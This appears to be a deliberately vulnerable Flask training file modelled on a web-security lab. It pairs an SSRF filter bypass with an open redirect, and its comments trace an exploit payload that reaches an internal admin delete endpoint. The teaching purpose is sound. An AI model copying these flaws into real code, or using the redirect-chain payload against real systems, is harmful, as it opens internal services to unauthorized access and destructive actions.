"""
VULNERABLE CODE — SSRF with Filter Bypass via Open Redirection
Language: Python (Flask)

TWO VULNERABILITIES:

  BUG 1 — SSRF in /product/stock
    The stockApi parameter is fetched server-side.
    Filter allows only local paths or the app's own domain.
    BUT: redirect following is enabled, so the filter is bypassed
    via an open redirect on the allowed domain.

  BUG 2 — Open Redirect in /product/nextProduct
    The `path` parameter is written directly into the Location header
    with no validation. Redirects to any URL the attacker supplies.

CHAIN:
    stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
    → filter passes (local path)
    → server follows 302 to http://192.168.0.12:8080/admin
    → internal admin returned
"""

from flask import Flask, request, jsonify, redirect, abort
import requests
from urllib.parse import urlparse

app = Flask(__name__)

APP_DOMAIN = "your-lab-id.web-security-academy.net"


# ── BUG 1: SSRF with local-only filter but redirect following enabled ─────────

def is_allowed_url(url: str) -> bool:
    """
    Filter: only allow local paths or this app's own domain.
    FLAW: Does not validate redirect destinations.
    FLAW: HTTP client follows redirects after this check passes.
    """
    # Allow relative/local paths
    if url.startswith("/"):
        return True

    # Allow requests to the app's own domain
    try:
        parsed = urlparse(url)
        if parsed.hostname == APP_DOMAIN:
            return True
    except Exception:
        pass

    return False


@app.route("/product/stock", methods=["POST"])
def check_stock():
    stock_api_url = request.form.get("stockApi")

    if not stock_api_url:
        abort(400, "stockApi required")

    # ❌ BUG 1a: Filter checks ONLY the initial URL
    if not is_allowed_url(stock_api_url):
        abort(400, "External stock check blocked for security reasons")

    # Handle relative URLs — prepend the base
    if stock_api_url.startswith("/"):
        stock_api_url = f"https://{APP_DOMAIN}{stock_api_url}"

    # ❌ BUG 1b: allow_redirects=True (default) — follows 302 to internal target
    # This means: even if the first URL passes the filter,
    # a redirect to http://192.168.0.12:8080/admin will be followed
    response = requests.get(
        stock_api_url,
        allow_redirects=True,   # ← THE VULNERABILITY: should be False
    )

    return jsonify({"stock": response.text}), response.status_code


# ── BUG 2: Open Redirect in nextProduct ──────────────────────────────────────

@app.route("/product/nextProduct")
def next_product():
    # ❌ BUG 2: path parameter written directly into Location header
    # No validation — redirects to ANY URL the attacker supplies
    path = request.args.get("path", "/")

    # Intended use: path = "/product?productId=2"
    # Attacker use: path = "http://192.168.0.12:8080/admin"
    return redirect(path)   # ← no validation on 'path'


# ============================================================
# ATTACK TRACE — what happens during exploitation:
#
# Attacker sends:
#   POST /product/stock
#   stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
#
# is_allowed_url() checks:
#   url.startswith("/") → True → PASSES
#
# Full URL constructed:
#   https://app.domain/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
#
# requests.get() fetches it:
#   GET /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
#   Response: 302 Location: http://192.168.0.12:8080/admin/delete?username=carlos
#
# allow_redirects=True → follows the 302:
#   GET /admin/delete?username=carlos
#   Host: 192.168.0.12:8080
#   Response: 302 (carlos deleted)
#
# Filter was bypassed. Internal action executed.
# ============================================================


if __name__ == "__main__":
    app.run(debug=True)
